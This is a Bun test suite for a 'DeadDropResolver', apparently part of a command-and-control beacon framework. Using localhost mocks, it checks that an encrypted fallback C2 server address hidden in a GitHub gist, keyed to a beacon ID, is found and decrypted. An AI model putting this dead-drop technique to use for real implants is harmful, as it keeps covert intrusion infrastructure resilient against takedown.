import { describe, it, expect, beforeAll } from "bun:test";
import { createHash } from "node:crypto";
import { DeadDropResolver } from "../recovery/DeadDropResolver.ts";
import { generateKeyPair, sealBox, bytesToBase64 } from "../crypto/sodium.ts";

type KeyPair = { publicKey: Uint8Array; secretKey: Uint8Array };

describe("DeadDropResolver", () => {
  let kp: KeyPair;

  beforeAll(async () => {
    kp = await generateKeyPair();
  });

  it("returns null when the search yields no results", async () => {
    const server = Bun.serve({
      port: 0,
      fetch() {
        return Response.json({ total_count: 0, items: [] });
      },
    });
    try {
      const r = new DeadDropResolver("tok", "owner", "repo");
      (r as any).apiBase = `http://localhost:${server.port}`;
      expect(await r.resolve("beacon-id", kp.secretKey)).toBeNull();
    } finally { server.stop(); }
  });

  it("decrypts a valid dead-drop and returns the payload", async () => {
    const beaconId = "test-beacon-abcdef12-3456-7890-abcd-ef1234567890";
    const tag = createHash("sha256").update(beaconId).digest("hex").slice(0, 16);
    const filename = `data-${tag}.bin`;
    const payload = { version: 1 as const, serverUrl: "https://new-c2:8080" };
    const sealed = await sealBox(JSON.stringify(payload), kp.publicKey);

    const server = Bun.serve({
      port: 0,
      async fetch(req) {
        const url = new URL(req.url);
        if (url.pathname.includes("/search/")) {
          return Response.json({
            total_count: 1,
            items: [{ html_url: "https://gist.github.com/user/deadbeef12345678" }],
          });
        }
        if (url.pathname.includes("/gists/")) {
          return Response.json({ files: { [filename]: { content: sealed } } });
        }
        return new Response("not found", { status: 404 });
      },
    });
    try {
      const r = new DeadDropResolver("tok", "owner", "repo");
      (r as any).apiBase = `http://localhost:${server.port}`;
      const result = await r.resolve(beaconId, kp.secretKey);
      expect(result).not.toBeNull();
      expect(result!.version).toBe(1);
      expect(result!.serverUrl).toBe("https://new-c2:8080");
    } finally { server.stop(); }
  });

  it("returns null when the ciphertext was encrypted to a different key", async () => {
    const otherKp = await generateKeyPair();
    const beaconId = "wrong-key-beacon";
    const tag = createHash("sha256").update(beaconId).digest("hex").slice(0, 16);
    const filename = `data-${tag}.bin`;
    // Encrypt with otherKp so decryption with kp.secretKey fails
    const sealed = await sealBox(JSON.stringify({ version: 1 }), otherKp.publicKey);

    const server = Bun.serve({
      port: 0,
      async fetch(req) {
        const url = new URL(req.url);
        // Search route: returns successful search result
        if (url.pathname.includes("/search/")) {
          return Response.json({
            total_count: 1,
            items: [{ html_url: "https://gist.github.com/user/badbeef12345678" }],
          });
        }
        // Gist fetch route: returns ciphertext that is encrypted to different key
        return Response.json({ files: { [filename]: { content: sealed } } });
      },
    });
    try {
      const r = new DeadDropResolver("tok", "owner", "repo");
      (r as any).apiBase = `http://localhost:${server.port}`;
      // Decryption fails because ciphertext was sealed to otherKp, not kp
      expect(await r.resolve(beaconId, kp.secretKey)).toBeNull();
    } finally { server.stop(); }
  });

  it("returns null on network error (never throws)", async () => {
    const r = new DeadDropResolver("tok", "owner", "repo");
    (r as any).apiBase = "http://localhost:1";  // nothing listening
    expect(await r.resolve("any-id", kp.secretKey)).toBeNull();
  });
});
